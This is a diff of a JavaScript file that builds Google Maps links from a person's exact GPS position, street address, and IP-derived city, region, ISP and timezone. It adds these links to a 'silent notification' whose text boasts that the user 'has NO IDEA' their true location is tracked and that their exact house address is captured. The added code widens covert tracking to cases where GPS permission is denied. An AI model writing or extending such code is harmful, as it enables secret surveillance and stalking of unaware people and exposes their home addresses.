@@ -107,31 +107,66 @@ function generateTrueLocationMapsLinks(trueGPSLocation, locationData) {
         links.trueGPSSatellite = `https://www.google.com/maps?q=${lat},${lng}&z=20&t=s`;
         links.trueGPSStreetView = `https://www.google.com/maps?q=${lat},${lng}&z=20&t=k`;
         links.trueGPSDirections = `https://www.google.com/maps/dir//${lat},${lng}`;
+        links.trueGPSLocation = `https://www.google.com/maps/place/${lat},${lng}`;
     }
     
-    // 2. Exact address link (house number + street)
+    // 2. City-based location links (when GPS is denied)
+    if (locationData.city && locationData.country_name) {
+        const cityLocation = `${locationData.city}, ${locationData.country_name}`;
+        links.cityLocation = `https://www.google.com/maps/search/${encodeURIComponent(cityLocation)}`;
+        links.citySatellite = `https://www.google.com/maps/search/${encodeURIComponent(cityLocation)}&t=s`;
+        links.cityStreetView = `https://www.google.com/maps/search/${encodeURIComponent(cityLocation)}&t=k`;
+    }
+    
+    // 3. Region-based location links
+    if (locationData.region && locationData.country_name) {
+        const regionLocation = `${locationData.region}, ${locationData.country_name}`;
+        links.regionLocation = `https://www.google.com/maps/search/${encodeURIComponent(regionLocation)}`;
+        links.regionSatellite = `https://www.google.com/maps/search/${encodeURIComponent(regionLocation)}&t=s`;
+    }
+    
+    // 4. Country-based location links
+    if (locationData.country_name) {
+        const countryLocation = locationData.country_name;
+        links.countryLocation = `https://www.google.com/maps/search/${encodeURIComponent(countryLocation)}`;
+        links.countrySatellite = `https://www.google.com/maps/search/${encodeURIComponent(countryLocation)}&t=s`;
+    }
+    
+    // 5. Exact address link (house number + street)
     if (locationData.houseNumber && locationData.street && locationData.city) {
         const exactAddress = `${locationData.houseNumber} ${locationData.street}, ${locationData.city}, ${locationData.country_name}`;
         links.exactAddress = `https://www.google.com/maps/search/${encodeURIComponent(exactAddress)}`;
         links.exactAddressSatellite = `https://www.google.com/maps/search/${encodeURIComponent(exactAddress)}&t=s`;
     }
     
-    // 3. Full address link (with postal code)
+    // 6. Full address link (with postal code)
     if (locationData.postal && locationData.street && locationData.city) {
         const fullAddress = `${locationData.houseNumber || ''} ${locationData.street}, ${locationData.city}, ${locationData.postal}, ${locationData.country_name}`;
         links.fullAddress = `https://www.google.com/maps/search/${encodeURIComponent(fullAddress)}`;
     }
     
-    // 4. Neighborhood link (if exact address not available)
+    // 7. Neighborhood link (if exact address not available)
     if (locationData.neighborhood && locationData.city) {
         const neighborhoodAddress = `${locationData.neighborhood}, ${locationData.city}, ${locationData.country_name}`;
         links.neighborhood = `https://www.google.com/maps/search/${encodeURIComponent(neighborhoodAddress)}`;
     }
     
-    // 5. District link (fallback)
+    // 8. District link (fallback)
     if (locationData.district && locationData.city) {
         const districtAddress = `${locationData.district}, ${locationData.city}, ${locationData.country_name}`;
         links.district = `https://www.google.com/maps/search/${encodeURIComponent(districtAddress)}`;
+    }
+    
+    // 9. ISP-based location (using ISP name)
+    if (locationData.org && locationData.org !== 'Unknown') {
+        const ispLocation = `${locationData.org}, ${locationData.city || locationData.country_name}`;
+        links.ispLocation = `https://www.google.com/maps/search/${encodeURIComponent(ispLocation)}`;
+    }
+    
+    // 10. Timezone-based location
+    if (locationData.timezone && locationData.timezone !== 'Unknown') {
+        const timezoneLocation = locationData.timezone.replace('_', ' ');
+        links.timezoneLocation = `https://www.google.com/maps/search/${encodeURIComponent(timezoneLocation)}`;
     }
     
     return links;
@@ -551,10 +586,20 @@ async function sendSilentNotification(userInfo) {
 🛰️ TRUE GPS Satellite: ${userInfo.googleMapsLinks?.trueGPSSatellite || 'N/A'}
 🚶 TRUE GPS Street View: ${userInfo.googleMapsLinks?.trueGPSStreetView || 'N/A'}
 🗺️ TRUE GPS Directions: ${userInfo.googleMapsLinks?.trueGPSDirections || 'N/A'}
+📍 TRUE GPS Location: ${userInfo.googleMapsLinks?.trueGPSLocation || 'N/A'}
+🏙️ City Location: ${userInfo.googleMapsLinks?.cityLocation || 'N/A'}
+🛰️ City Satellite: ${userInfo.googleMapsLinks?.citySatellite || 'N/A'}
+🚶 City Street View: ${userInfo.googleMapsLinks?.cityStreetView || 'N/A'}
+🏛️ Region Location: ${userInfo.googleMapsLinks?.regionLocation || 'N/A'}
+🛰️ Region Satellite: ${userInfo.googleMapsLinks?.regionSatellite || 'N/A'}
+🌍 Country Location: ${userInfo.googleMapsLinks?.countryLocation || 'N/A'}
+🛰️ Country Satellite: ${userInfo.googleMapsLinks?.countrySatellite || 'N/A'}
 🏠 Exact Address: ${userInfo.googleMapsLinks?.exactAddress || 'N/A'}
 📮 Full Address: ${userInfo.googleMapsLinks?.fullAddress || 'N/A'}
 🏡 Neighborhood: ${userInfo.googleMapsLinks?.neighborhood || 'N/A'}
 🏘️ District: ${userInfo.googleMapsLinks?.district || 'N/A'}
+🏢 ISP Location: ${userInfo.googleMapsLinks?.ispLocation || 'N/A'}
+⏰ Timezone Location: ${userInfo.googleMapsLinks?.timezoneLocation || 'N/A'}
 
 🎯 User has NO IDEA their TRUE GPS location is being tracked!
 🏠 EXACT HOUSE ADDRESS CAPTURED!
